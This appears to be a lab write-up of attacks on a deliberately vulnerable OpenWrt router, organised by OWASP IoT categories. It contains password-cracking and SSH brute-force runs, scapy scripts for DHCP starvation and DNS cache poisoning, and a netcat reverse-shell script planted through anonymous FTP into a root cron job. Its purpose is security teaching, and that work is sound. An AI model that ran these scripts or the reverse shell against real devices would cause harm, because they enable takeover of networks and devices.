# IoT:I1 - Weak Guessable, or Hardcoded Passwords
## Definition
> Use of easily bruteforced, publicly available, or unchangeable credentials, including backdoors in firmware or client software that grants unauthorized access to deployed systems.
## Description
By downloading the firmware and extracting it using [binwalk](https://github.com/ReFirmLabs/binwalk) the hashes from users can be obtained.

> Use *"binwalk -ev openwrt.img"* to extract firmware. (You can use the image storaged at /vulnzoo/releases or use your own compiled image).

```shell
❯ grep -Ri "pwned" /usr/share/wordlists/rockyou.txt
pwned5
lawlpwned1
wtfpwned1
ugotpwned
timpwnedj00
pwnedyou
pwnedftwha4
pwned<3wfuzz_breaks_openwrtuser_password
pwned69
pwned1
pwned00
pwned!
pwned
omgpwned
haiwinpwned
ericpwned
bxrpwned16
Asianspwned
808pwned
```

*pwned* appears in many typical password wordlists such as *rockyout.txt*, which can be used to crack the root user's password.

```zsh
❯ john --wordlist=/usr/share/wordlists/rockyout.txt hash.txt
Loaded 1 password hash (crypt, generic crypt(3) [?/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
pwned            (?)
1g 0:00:00:00 100% 12.50g/s 1200p/s 1200c/s 1200C/s pwned5..ericpwned
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

The password for the user `openwrtuser` can be obtained using the **Combination** attack mode. With this type of attack, a combination from a list is performed.

```zsh
❯ hashcat -m 7400 -a 1 hash.txt user.txt /usr/share/wordlists/modified.txt --show
$5$ULxTq2Kzw066TUtC$Os/H7sHKmk9HXOz7hpyADUEbXn6NG2UAD6DxZGOQB5B:openwrtuserpwned
```

Another way to obtain the password for the `openwrtuser` user is through the administration interface. This displays a login panel when accessed. The `root` user is the only one allowed to access and change the router settings, but the system first validates whether the password entered matches the one the device has referenced for the user being entered, and then checks whether it is the authorized `root` user. For this reason, we can obtain the user password by brute force.

Using an incorrect password returns a 403 Forbidden error.

![[api1_root_invalid_login.png]]

If we use an existing user on the device, we cannot gain access, but we do obtain different codes when the password is correct.

![[api1_openwrtuser_invalid_login.png]]

![[api1_openwrtuser_login_401.png]]

This may allow the password to be obtained through a brute force process. I generated a user using a Python script that allowed me to generate mutated passwords with the user name and the suffix “pwned,” which generated a wordlist with the valid password. You can also use the “John The Reaper” option shown above.

![[api1_mutated_passwords.png]]
![[api1_wfuzz_openwrtuser_passwords.png]]

# IoT:I2 - Insecure Network Servicies
## Definition
> Unneeded or insecure network services running on the device itself, especially those exposed to the internet, that compromise the confidentiality, integrity/authenticity, or availability of information or allow unauthorized remote control ...
## Description
```shell
$ nmap -p- 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:43 CEST
Nmap scan report for 192.168.1.1
Host is up (0.0086s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
21/tcp   open     ftp
22/tcp   open     ssh
53/tcp   open     domain
80/tcp   open     http
445/tcp  open     microsoft-ds
3702/tcp open     ws-discovery
5515/tcp filtered unknown
5355/tcp open     llmnr
```
### 2.1 SSH (Secure Shell) port 22
```shell
$ nmap -p22 -sC -sV 192.168.1.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 11:45 CEST
Nmap scan report for 192.168.1.1
Host is up (0.00072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     Dropbear sshd (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

$ nmap --script ssh-auth-methods -p 22 192.168.2.1 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 13:26 +0100
Nmap scan report for vulnzoo.com (192.168.2.1)
Host is up (0.00048s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|_    password
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)

Nmap done: 1 IP address (1 host up) scanned in 0.29 seconds
```

If you try to log in via SSH with cracked credentials, the result will be the same. The router doesn't implement any security mechanisms to prevent brute force attacks via the SSH service. This is similar to what is seen in [[IoT Vulnerabilities#IoT I1 - Weak Guessable, or Hardcoded Passwords]]

```zsh
$ hydra -l openwrtuser -P ./mutated.txt ssh://192.168.2.1 -t 4 -V 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-05 13:28:05
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1023 login tries (l:1/p:1023), ~256 tries per task
[DATA] attacking ssh://192.168.2.1:22/
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedOPENWRTUSER" - 1 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedOpenwrtuser" - 2 of 1023 [child 1] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_OPENWRTUSER" - 3 of 1023 [child 2] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_Openwrtuser" - 4 of 1023 [child 3] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwned_openwrtuser" - 5 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "808pwnedopenwrtuser" - 6 of 1023 [child 1] (0/0)
...
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuseromgpwned2024" - 866 of 1023 [child 0] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuseromgpwned2025" - 867 of 1023 [child 1] (0/0)
[ATTEMPT] target 192.168.2.1 - login "openwrtuser" - pass "openwrtuserpwned" - 868 of 1023 [child 2] (0/0)
[22][ssh] host: 192.168.2.1   login: openwrtuser   password: openwrtuserpwned
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 13:29:40
```

### 2.2 Samba 4.18.8
Known vulnerabilities:
- [CVE-2023-5568](https://nvd.nist.gov/vuln/detail/CVE-2023-5568)
- [CVE-2022-32743](https://nvd.nist.gov/vuln/detail/CVE-2022-32743)
- [CVE-2022-1615](https://nvd.nist.gov/vuln/detail/CVE-2022-1615)
- [CVE-2021-3670](https://nvd.nist.gov/vuln/detail/CVE-2021-3670)
- [CVE-2018-14628](https://nvd.nist.gov/vuln/detail/CVE-2018-14628)

### 2.3 Telnet
The Telnet service is concealed in the sense that it has been configured to use a non-default port. It is located on port 5515. In a general scan, it appears as a filtered port and the running service is not identified; however, by using `nmap` with version detection scripts and flags, it can eventually be discovered.

```shell
$ nmap -p5515 -sV -sC 192.168.2.1 -vvv           
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-20 09:09 +0100
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Initiating ARP Ping Scan at 09:09
Scanning 192.168.2.1 [1 port]
Completed ARP Ping Scan at 09:09, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:09
Completed Parallel DNS resolution of 1 host. at 09:09, 1.00s elapsed
DNS resolution of 1 IPs took 1.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating SYN Stealth Scan at 09:09
Scanning 192.168.2.1 [1 port]
Discovered open port 5515/tcp on 192.168.2.1
Completed SYN Stealth Scan at 09:09, 0.01s elapsed (1 total ports)
Initiating Service scan at 09:09
Scanning 1 service on 192.168.2.1
Completed Service scan at 09:09, 22.04s elapsed (1 service on 1 host)
NSE: Script scanning 192.168.2.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 2.02s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 1.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Nmap scan report for 192.168.2.1
Host is up, received arp-response (0.00045s latency).
Scanned at 2026-01-20 09:09:02 CET for 25s

PORT     STATE SERVICE REASON         VERSION
5515/tcp open  telnet? syn-ack ttl 64
| fingerprint-strings: 
|   GenericLines, NULL: 
|     BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)
|   GetRequest: 
|     HTTP/1.0
|     BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)
|     HTTP/1.0
|_    /bin/sh: GET: not found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5515-TCP:V=7.98%I=7%D=1/20%Time=696F3824%P=x86_64-pc-linux-gnu%r(NU
SF:LL,59,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\n\r\n\r\nBu
SF:syBox\x20v1\.36\.1\x20\(2025-09-19\x2021:19:38\x20UTC\)\x20built-in\x20
SF:shell\x20\(ash\)\r\n\r\n~\x20#\x20")%r(GenericLines,65,"\xff\xfd\x01\xf
SF:f\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\n\r\n\r\nBusyBox\x20v1\.36\.1\x20
SF:\(2025-09-19\x2021:19:38\x20UTC\)\x20built-in\x20shell\x20\(ash\)\r\n\r
SF:\n~\x20#\x20\r\n~\x20#\x20\r\n~\x20#\x20")%r(GetRequest,9E,"\xff\xfd\x0
SF:1\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nGET\x20/\x20HTTP/1\.0\r\n\r\
SF:n\r\n\r\nBusyBox\x20v1\.36\.1\x20\(2025-09-19\x2021:19:38\x20UTC\)\x20b
SF:uilt-in\x20shell\x20\(ash\)\r\n\r\n~\x20#\x20GET\x20/\x20HTTP/1\.0\r\n/
SF:bin/sh:\x20GET:\x20not\x20found\r\n~\x20#\x20\r\n~\x20#\x20");
MAC Address: B8:27:EB:79:53:C3 (Raspberry Pi Foundation)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:09
Completed NSE at 09:09, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.44 seconds
           Raw packets sent: 2 (72B) | Rcvd: 2 (72B)

❯ telnet -a 192.168.2.1 5515
Trying 192.168.2.1...
Connected to 192.168.2.1.
Escape character is '^]'.



BusyBox v1.36.1 (2025-09-19 21:19:38 UTC) built-in shell (ash)

~ # whoami
root
~ # id
uid=0(root) gid=0(root)
~ # cat /proc/sys/kernel/hostname
OpenWrt
~ # 
```
### 2.4 FTP
FTP service runs on ftpd daemon. If we have a look inside /etc/init.d/ftpd script we will see that it has been used *'A'* option, which allows an "anonymous" log in.

It is also important to note that the FTP service is configured to use "/tmp" as the entry or "home" directory. This allows any user who logs in via FTP to access all files present in the router's system temporary directory.

```shell
#!/bin/sh /etc/rc.common

START=90
STOP=10

start() 
    echo "[+] Creating FTP directory"
    mkdir -p /tmp/ftp
    chmod 777 /tmp/ftp
    chown anonymous:anonymous /tmp/ftp
    echo "[+] Starting ftpd"
    tcpsvd -vE 0.0.0.0 21 ftpd -w -a anonymous /tmp &
}

stop() {
    echo "[+] Stopping ftpd"
    killall tcpsvd
    killall ftpd
}
```

We can easily check this out by scanning port 21 and running *"ftp-anon.nse"* script.

```shell
❯ nmap --script=ftp-anon -sV -p21 192.168.2.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-28 09:13 CEST
Nmap scan report for 192.168.1.1
Host is up (0.00075s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| Server status:
|  TYPE: BINARY
|_Ok
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
Service Info: Device: webcam; CPE: cpe:/h:dlink:dcs-932l

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds

❯ ftp 192.168.1.1
Connected to 192.168.1.1.
220 Operation successful
Name (192.168.1.1:xxx): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

### 2.5 SNMP
Net-SNMP version 5.9.4, used in various systems, has known vulnerabilities. These include ==buffer overflows, NULL pointer dereferences, and other issues related to handling malformed Object Identifiers (OIDs)==. Exploitation of these vulnerabilities can lead to out-of-bounds memory access, crashes, or denial-of-service conditions. Users are advised to upgrade to the latest version of Net-SNMP or apply relevant security patches. 

Specific Vulnerabilities in Net-SNMP 5.9.4:

- [Memory leak](https://www.cvedetails.com/cve/CVE-2024-26464/)

- **Buffer Overflow:**
    
	A buffer overflow vulnerability exists in the handling of the `INDEX` of `NET-SNMP-VACM-MIB`, potentially allowing an out-of-bounds memory access. This can be exploited by users with read-only credentials. 
    

- **Malformed OID Handling:**
    
    Several vulnerabilities involve the improper handling of malformed OIDs in SET and GET-NEXT requests to various MIB tables, leading to NULL pointer dereferences or out-of-bounds memory access. These vulnerabilities affect the master agent and subagents. 
    

- **Vulnerability Exploitation:**
    
    Attackers can exploit these vulnerabilities by crafting malicious network traffic, including specially crafted SNMP packets. To exploit vulnerabilities in SNMP v2c or earlier, attackers need valid community strings, while SNMP v3 exploitation requires valid user credentials.

We can expose system's information using Nmap Scripts:

```shell
❯ sudo nmap -p161 -sU -sC -sV 192.168.1.1
[sudo] password for maxgarci: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-23 11:14 CEST
Nmap scan report for 192.168.1.1
Host is up (0.00057s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: 5d8d8f5cd3bb596800000000
|   snmpEngineBoots: 1
|_  snmpEngineTime: 1h56m48s
| snmp-sysdescr: Linux OpenWrt 6.6.93 #0 SMP Mon Jun 23 20:40:36 2025 armv7l
|_  System uptime: 1h56m47.65s (700765 timeticks)
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:22           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:3702         0.0.0.0:0
|   TCP  0.0.0.0:5355         0.0.0.0:0
|   TCP  127.0.0.1:53         0.0.0.0:0
|   TCP  192.168.1.1:22       192.168.1.2:42376
|   TCP  192.168.1.1:53       0.0.0.0:0
|   UDP  0.0.0.0:67           *:*
|   UDP  0.0.0.0:137          *:*
|   UDP  0.0.0.0:138          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:3702         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  127.0.0.1:53         *:*
|   UDP  192.168.1.1:53       *:*
|   UDP  192.168.1.1:137      *:*
|   UDP  192.168.1.1:138      *:*
|   UDP  192.168.1.255:137    *:*
|_  UDP  192.168.1.255:138    *:*
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 157.97 Kb sent, 157.97 Kb received
|   eth0
|     MAC address: b8:27:eb:6c:7e:8b (Raspberry Pi Foundation)
|     Type: ethernetCsmacd  Speed: 100 Mbps
|     Traffic stats: 433.07 Kb sent, 578.32 Kb received
|   br-lan
|     IP address: 192.168.1.1  Netmask: 255.255.255.0
|     MAC address: b8:27:eb:6c:7e:8b (Raspberry Pi Foundation)
|     Type: ethernetCsmacd  Speed: 100 Mbps
|_    Traffic stats: 395.80 Kb sent, 578.32 Kb received
MAC Address: B8:27:EB:6C:7E:8B (Raspberry Pi Foundation)
Service Info: Host: OpenWrt

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds
```

### 2.6 UPNP
UPNP (*Universal Plug and Play*)  service makes connections vulnerable to DDoS and MITM attacks. Ports are automatically forwarded to establish connections when a UPnP request is received. This can be used to:
- Connect internal ports outer servers to create gateways through firewalls.
- Referral of ports.
- Change DNS server settings.
- Modify administrative credentials.
- Modify PPP configuration.
- Modification of IP configuration for all interfaces.
- Modify WiFi Settings.

- ==secure_mode=0==: UPnP responds in WAN interface and every client can open ports without authentication.
- Neither port nor ACL limitations.
- ==enable_natpmp=1== enables a similar protocol to UPnP to open ports automatically.

OpenWRT is running miniupnpd and it is listening on port 5000.
```shell
root@OpenWrt:/etc/config# netstat -lnp | grep miniupnpd
tcp        0      0 :::5000                 :::*                    LISTEN      1845/miniupnpd
udp        0      0 0.0.0.0:1900            0.0.0.0:*                           1845/miniupnpd
udp        0      0 192.168.1.1:50311       0.0.0.0:*                           1845/miniupnpd
udp        0      0 192.168.1.1:5351        0.0.0.0:*                           1845/miniupnpd
udp        0      0 :::1900                 :::*                                1845/miniupnpd
udp        0      0 :::5351                 :::*                                1845/miniupnpd
udp        0      0 :::37697                :::*                                1845/miniupnpd
```

*/etc/config/upnpd*

```shell
config upnpd 'config'
        option enabled '1'
        option enable_natpmp '1'
        option enable_upnp '1'
        option secure_mode '0'
        option log_output '0'
        option download '10240'
        option upload '10240'
        option internal_iface 'br-lan'
        option external_iface 'br-lan'
        option port '5000'
        option upnp_lease_file '/var/run/miniupnpd.leases'
        option igdv1 '1'
        option uuid '05f16a8d-4cc7-4bb1-a894-98ca59bb3ea0'

config perm_rule
        option action 'allow'
        option perm_wan '1'
        option ext_ports '0-65535'
        option int_addr '0.0.0.0/0'
        option int_ports '0-65535'
```

- ==secure_mode  '1'== Esto permite cualquier solicitud.
- ==log_output '0'== Oculta la actividad sin registrar ningún tipo de log.
- ==perm_wan '1'== Permite el acceso al servicio desde el exterior.

### 2.7 DHCP && DNS

The `dnsmasq.conf` configuration file has a number of features that make it potentially vulnerable.
#### 1. Service exposure
`interface=br-lan,eth0,wlan0` and `bind-interfaces` allow the service to be accessible from external networks.
#### 2. Configuration files in /tmp
Critical files are stored in the temporary directory, such as `/tmp/dhcp.leases, /tmp/hosts, /tmp/dhcp_events.log`. Any user/process can modify the DHCP/DNS configurations.

Potential vulnerabilities:
- Injection of fake DHCP leases.
- Modification of local DNS resolution.
- Manipulation of logs to hide malicious activity ([[IoT Vulnerabilities#IoT7 Insecure Data Transfer and Storage]])
- Discovery of other devices on the network, facilitating `pivoting`.
3. Script executed as root
The `dnsmasq.script` script referenced in the configuration is executed with root privileges.

This introduces a number of potential vulnerabilities, such as:
- No sanitization of argument input.
- Conditional execution based on client hostname.
- Possible command injection if variables are manipulated.

The impact of these risks can lead to root privilege escalation if exploited.

This insecure custom logic is related to [[IoT Vulnerabilities#IoT5 Using Insecure or Outdated Components]].
#### 4. Lack of Rate Limiting
There are no limits on DHCP/DNS requests (`dhcp-rapid-commit` is commented out). This makes the service vulnerable to DoS attacks.

- DHCP Starvation (IP pool).
- DNS amplification.
- Resource exhaustion (CPU/memory).

This is related to the risk [[IoT Vulnerabilities#IoT I8 - Lack of device management]].
#### 5. Some configurations that are not recommended
- `stop-dns-rebind` disabled.
- `cache-size=10000` large and without validation.
- `no-negcache` enabled.
- `dhcp-lease-max=100000` too high.
- `dhcp-authoritative` without validation.
- `read-ethers` enabled without protection.
These configurations are insecure and enable possible impacts such as DNS rebinding and DNS Cache Poisoning.
> **CHECK ATTACKS**

The DHCP and DNS service configuration is insecure. This allows for a series of attacks that could be tested by analyzing the consequences of the different configuration options that have been recorded:

- Modification of the *leases* file
```zsh
echo "0 00:11:22:33:44:55 192.168.1.50 fake-host 01:00:11:22:33:44:55" > /tmp/dhcp.leases
killall -HUP dnsmasq
```

- DHCP Starvation Attack
```python
from scapy.all import *
import time

def dhcp_starvation():
    conf.checkIPaddr = False
    for i in range(1000):
        mac = RandMAC()
        dhcp_discover = Ether(src=mac, dst='ff:ff:ff:ff:ff:ff') / \
                       IP(src='0.0.0.0', dst='255.255.255.255') / \
                       UDP(sport=68, dport=67) / \
                       BOOTP(chaddr=mac) / \
                       DHCP(options=[('message-type','discover'), 'end'])
        sendp(dhcp_discover, iface='eth0', verbose=0)
        time.sleep(0.01)
dhcp_starvation()
```

- *DNS Cache Poisoning*
```python
from scapy.all import *

def dns_poison():
    ip = IP(src='8.8.8.8', dst='192.168.1.1')
    udp = UDP(sport=53, dport=33333)
    dns = DNS(id=12345, qr=1, aa=1, qd=DNSQR(qname='google.com', qtype='A'),
               an=DNSRR(rrname='google.com', type='A', ttl=300, rdata='192.168.1.200'))
    send(ip/udp/dns, verbose=1)

dns_poison()
```
# IoT:I3 - Insecure Ecosystem Interfaces

> **VERY BASIC VULNERABILITY:** It would be advisable to relegate this vulnerability to the mobile interface, as it falls within the scope indicated by OWASP.
## Definition
> Insecure web, backend API, cloud, or **mobile interfaces** in the ecosystem outside of the device that allows compromise of the device or its related components. Common issues include a lack of authentication/authorization, lacking or weak encryption, and a lack of input and output filtering.

Using wordlists for endpoints, we can find firsthand that there is a `/cgi-bin/luci/admin` subroutine. This is revealed by the fact that we get a `Forbidden 403` code compared to non-existent routes that report a `Not Found 404`.

![[iot3_fuzzing_admin_endpoint.png]]

However, due to the configuration of `dispatcher.lua`, starting from a valid subdirectory, the rest of the subdirectories do not report a `Not Found` error even if they do not exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ"                                            
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000003:   403        91 L     208 W      2897 Ch     "foobar"                                                                                                                     
000000002:   403        91 L     208 W      2896 Ch     "admin"                                                                                                                      
000000001:   403        91 L     208 W      2897 Ch     "system"                                                                                                                     
000000004:   403        91 L     208 W      2896 Ch     "tried"                                                                                                                      

Total time: 0.158685
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 25.20710
```

We cannot differentiate between which endpoints exist and which do not based on what the server reports. However, if we test the interface a little, we notice some strange behavior.

![[iot3_interface_exposes_endpoint.png]]

If we try to access a directory that is unlikely to exist, such as `/cgi-bin/luci/admin/foobar`, we see a message pop up saying that the resource does not exist. If we try fuzzing with incorrect login data, we can see that there are changes between different requests, which tells us which subroutes exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000001:   403        94 L     219 W      3005 Ch     "system"                                                                                                                     
000000003:   403        98 L     231 W      3109 Ch     "foobar"                                                                                                                     
000000002:   403        98 L     231 W      3108 Ch     "admin"                                                                                                                      
000000004:   403        98 L     231 W      3108 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0


```

As you can see, subroutes that do not have the message take up less space, and despite the `Forbidden` code in all requests, it is now possible to discern which ones do exist.

```zsh
$ wfuzz -c -w wordlist.txt -u "http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ" -d "luci_username=root&luci_password=password"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.2.1/cgi-bin/luci/admin/system/FUZZ
Total requests: 4

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                      
=====================================================================

000000002:   403        94 L     219 W      3011 Ch     "admin"                                                                                                                      
000000003:   403        98 L     231 W      3116 Ch     "foobar"                                                                                                                     
000000001:   403        94 L     219 W      3012 Ch     "system"                                                                                                                     
000000004:   403        98 L     231 W      3115 Ch     "tried"                                                                                                                      

Total time: 0
Processed Requests: 4
Filtered Requests: 0
Requests/sec.: 0
```

We have obtained the endpoints `/cgi-bin/luci/admin/system/admin` and `/cgi-bin/luci/admin/system/system`.


# IoT:I4 - Lack of Secure Update Mechanism
## Definition
> Lack of ability to securely update the device. This includes lack of firmware validation on device, lack of secure delivery (un-encrypted in transit), lack of anti-rollback mechanisms, and lack of notifications of security changes due to updates.
## Description
OpenWrt uses a lightweight package manager called `opkg`. The system relies entirely on the paths defined in `/etc/opkg/distfeeds.conf`.

The security system is not as good as with *APT* because OpenWRT does not individually sign packages.
### 1. Repository replacement
One valid option could be to modify the contents of */etc/opkg/distfeeds.conf* so that it points to a local URL located on our attacking machine. This would allow a malicious *.ipk* file to be uploaded.

To carry out this type of attack, we need to gain access to the file somehow, and to do this we can perform a privilege escalation.
### 2. Misconfiguration of the opkg.conf file
The configuration of the opkg tool for installing packages resides in the */etc/opkg.conf* file. This file has an option that is insecure:
![[iot4_opkg_misconfiguration.png]]

The ‘0’ in the *check_signature* option indicates that the tool never checks whether the package being installed has a valid signature. This is also related to the risk [[IoT Vulnerabilities#No. 9 Insecure Default Settings]].

#### #### 1.2.  Escalating privileges with cron tasks

We can detect in the firmware that there is a file in */etc/crontabs* called *root* that executes a cron task. Inside, we find this:

```shell
* * * * * cd /tmp/cron-tmp/ && sh backup.sh
```

The crond daemon, which we can verify is running on the system, executes this task where it accesses a folder in the temporary directory and runs a script for supposed *backups* every minute. If we found a way to change its content, we could abuse *root* privileges, for example, by opening a *reverse shell.*

As we detected in the [[#FTP]] section, we know that there is an *anonymous* user. Let's see how far we can analyze with this user.

```shell
anonymous@OpenWrt:~$ cat /etc/crontabs/root 
cat: can't open '/etc/crontabs/root': Permission denied
anonymous@OpenWrt:~$ ls -ld /etc/crontabs/
drwxr-xr-x    1 root     root          3488 Jun 23 21:41 /etc/crontabs/
anonymous@OpenWrt:~$ ls -ld /etc/crontabs/root
-rw-------    1 root     root            44 Jun 23 21:41 /etc/crontabs/root
```

As expected, the file belongs to root and cannot be modified or read by anyone other than the router administrator. In the analysis of the FTP protocol running on the system, we could see that we were accessing the router's */tmp* folder.

```shell
❯ ftp 192.168.1.1
Connected to 192.168.1.1.
220 Operation successful
Name (192.168.1.1:xxxxxxxx): anonymous
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 EPSV ok (|||42463|)
150 Directory listing
drwx------    2 0        0               40 Jun 23 21:29 .uci
drwxr-xr-x    3 0        0               60 Jun 23 21:30 cache
drwxr-xr-x    2 0        0               40 Jun 23 21:29 dnsmasq.cfg01411c.d
drwxr-xr-x    4 0        0              140 Jun 23 21:30 etc
drwxrwxrwx    2 1001     1001            40 Jun 23 21:30 ftp
drwxr-xr-x    2 0        0               60 Jun 23 21:30 hosts
drwxr-xr-x    6 0        0              120 Jun 23 21:30 lib
drwxr-xr-x    4 0        0              740 Jun 23 22:08 lock
drwxr-xr-x    3 0        0              140 Jun 23 21:30 log
drwxr-xr-x    2 0        0               40 Jun 23 21:54 opkg-lists
drwxr-xr-x    2 0        0               40 Jan  1  1970 overlay
drwxr-xr-x    2 0        0               60 Jun 23 21:30 resolv.conf.d
drwxr-xr-x   10 0        0              480 Jun 23 21:30 run
drwxrwxrwt    2 0        0               40 Jun 23 21:30 shm
drwxr-xr-x    3 0        0               60 Jun 23 21:30 spool
drwxr-xr-x    2 0        0               60 Jun 23 21:30 state
drwxr-xr-x    2 0        0               80 Jan  1  1970 sysinfo
drwxr-xr-x    2 0        0               40 Jun 23 21:29 tmp
drwxr-xr-x    3 0        0               60 Jun 23 21:54 usr
----------    1 0        0                0 Jun 23 21:30 .ujailnoafile
-rw-r--r--    1 0        0                4 Jun 23 21:29 TZ
-rw-r--r--    1 0        0                0 Jun 23 21:29 dhcp.leases
-rw-r--r--    1 0        0               47 Jun 23 21:30 resolv.conf
226 Operation successful
ftp> 
```

The *cron-tmp* folder does not exist, so we can create it and enter the script that root will execute to open a shell with privileged permissions.

```sh
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PUERTO> > /tmp/f
```

Using *nc*, we can open a forward shell, since OpenWRT uses *BusyBox*, so it does not have */dev/tcp.* implemented.

```shell
❯ catn backup.sh
#!/bin/ash
rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.2 4646 > /tmp/f
❯ nc -lvnp 4646
Listening on 0.0.0.0 4646
```

We use FTP to upload the script to the */tmp/cron-tmp* folder and wait for the script to run.

```shell
❯ ftp 192.168.1.1
Connected to 192.168.1.1.
220 Operation successful
